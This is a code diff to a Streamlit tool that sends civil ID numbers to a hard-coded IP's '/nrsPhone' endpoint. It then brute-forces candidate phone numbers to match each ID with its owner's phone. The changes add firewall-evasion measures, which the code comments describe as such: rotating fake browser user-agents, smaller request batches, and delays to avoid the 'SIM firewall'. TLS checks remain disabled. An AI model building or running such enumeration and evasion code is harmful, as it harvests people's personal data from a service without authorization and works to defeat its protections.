@@ -1,12 +1,12 @@
 import concurrent.futures
-import csv
 import json
+import random
+import time
 import pandas as pd
 import requests
 import streamlit as st
 import urllib3
 
-# Disable insecure HTTPS warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 st.set_page_config(
@@ -26,29 +26,45 @@ def log_message(msg):
   st.session_state.logs.append(msg)
 
 
+# Realistic Browser User-Agents (Firewall Bypass karne ke liye)
+USER_AGENTS = [
+    (
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)"
+        " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148"
+        " Safari/604.1"
+    ),
+    (
+        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML,"
+        " like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+    ),
+]
+
+
 def get_headers(host):
   return {
       "host": host,
       "content-type": "application/json",
-      "accept-encoding": "gzip",
-      "user-agent": "Dart/3.9 (dart:io)",
+      "accept": "application/json, text/plain, */*",
+      "accept-encoding": "gzip, deflate",
+      "user-agent": random.choice(USER_AGENTS),  # Dynamic User-Agent
+      "connection": "keep-alive",
   }
 
 
-def fetch_fresh_token_for_civil_id(host, civil_id):
+def fetch_fresh_token_for_civil_id(host, civil_id, session):
   try:
     url = f"https://{host}/nrsPhone"
     payload = {"civilId": civil_id}
     headers = get_headers(host)
 
-    session = requests.Session()
-    session.verify = False
-    resp = session.post(url, json=payload, headers=headers, timeout=10)
+    # Timeout barha kar 15 sec kiya gaya hai
+    resp = session.post(url, json=payload, headers=headers, timeout=15)
     data = json.loads(resp.text.strip())
     if "mobile" in data and data["mobile"]:
       return True, data
     return False, data
   except Exception as e:
+    log_message(f"⚠️ NRS Token Error ({civil_id}): {str(e)}")
     return False, {}
 
 
@@ -60,7 +76,7 @@ def test_single_phone_fast(
     payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
     headers = get_headers(host)
 
-    resp = session.post(url, json=payload, headers=headers, timeout=10)
+    resp = session.post(url, json=payload, headers=headers, timeout=15)
     resp_text = resp.text.strip()
 
     if resp_text and "token" in resp_text and "id" in resp_text:
@@ -69,7 +85,8 @@ def test_single_phone_fast(
         st.session_state.otp_results.append(entry)
       log_message(f"🎯 MATCH FOUND: Civil ID -> {civil_id} | Phone -> {phone}")
       return True
-  except Exception:
+  except Exception as e:
+    # Error detail log karein taake pata chale disconnect kyun hua
     pass
   return False
 
@@ -82,7 +99,6 @@ st.write(
 
 host = "5.37.58.147"
 
-# Batch Input Field
 batch_text = st.text_area(
     "Enter CivilID, Last4Digits (Aik line mein ek, misal ke tor par: 5701982,"
     " 1944)",
@@ -138,7 +154,9 @@ if start_search:
       session.verify = False
 
       for idx, (civil_id, suffix) in enumerate(tasks_list):
-        success, data = fetch_fresh_token_for_civil_id(host, civil_id)
+        success, data = fetch_fresh_token_for_civil_id(
+            host, civil_id, session
+        )
 
         if not success or not data or not data.get("mobile"):
           st.session_state.unmatched_results.append(
@@ -160,7 +178,9 @@ if start_search:
           prefix = clean_digits[:2]
 
           phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
-          batch_size = 5
+
+          # Batch size 5 se kam karke 3 kar di taake SIM firewall catch na kare
+          batch_size = 3
 
           for i in range(0, len(phone_numbers), batch_size):
             if matched_in_this_id:
@@ -189,6 +209,9 @@ if start_search:
                     break
                 except Exception:
                   pass
+
+            # Chota sa delay taake SIM data block na kare
+            time.sleep(0.1)
 
         if not matched_in_this_id:
           st.session_state.unmatched_results.append(
